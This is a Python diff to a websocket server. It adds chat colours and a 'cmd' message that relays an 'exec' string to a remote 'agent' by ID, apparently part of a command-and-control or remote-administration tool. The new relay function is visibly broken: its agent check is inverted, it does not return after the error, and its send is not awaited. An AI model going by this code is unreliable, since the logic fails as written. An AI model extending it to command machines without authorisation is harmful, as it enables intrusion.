@@ -1,5 +1,5 @@
 from lib import logger
-from lib.vglobals.sharedvars import clients_session
+from lib.vglobals.sharedvars import clients_session, agents
 
 from websockets import server
 from websockets import exceptions as wsExceptions
@@ -35,10 +35,19 @@ async def remove_client(websocket: server.WebSocketServerProtocol):
     connections.remove(websocket)
 
 
-async def broadcast_chat(msg: str, username: str):
+async def broadcast_chat(msg: str, color_code: int, username: str):
     for connection in connections:
-        await connection.send(response({"username": username, "message": msg}, "chat", 0))
+        await connection.send(response({"username": username, "color": color_code, "message": msg}, "chat", 0))
         
+
+async def send_to_agent(websocket: server.WebSocketServerProtocol, __data: str, agent_id: str):
+    # TODO: ...
+    if agent_id in agents:
+        await websocket.send(response("Agent not found", "error", 404))
+    
+    agent_connection = agents[agent_id]
+
+    agent_connection.send(__data.encode())
 
 async def handle_messages(websocket: server.WebSocketServerProtocol):
     async for message in websocket:
@@ -55,7 +64,10 @@ async def handle_messages(websocket: server.WebSocketServerProtocol):
 
         match mtype:
             case "chat":
-                await broadcast_chat(message["msg"], get_client_from_id(session))
+                await broadcast_chat(message["msg"],message["color"], get_client_from_id(session))
+
+            case "cmd":
+                await send_to_agent(websocket, message["exec"], message["target"])
 
             case _:
                 ...
@@ -78,7 +90,7 @@ async def whandler(websocket: server.WebSocketServerProtocol):
 
 async def _run(ip: str, port: int):
     async with server.serve(whandler, ip, port):
-        logger.success(f"Websocket server started: {ip}:{port}")
+        logger.debug(f"Websocket server started: {ip}:{port}")
         await asyncio.Future()
 
 def run(ip: str, port: int):
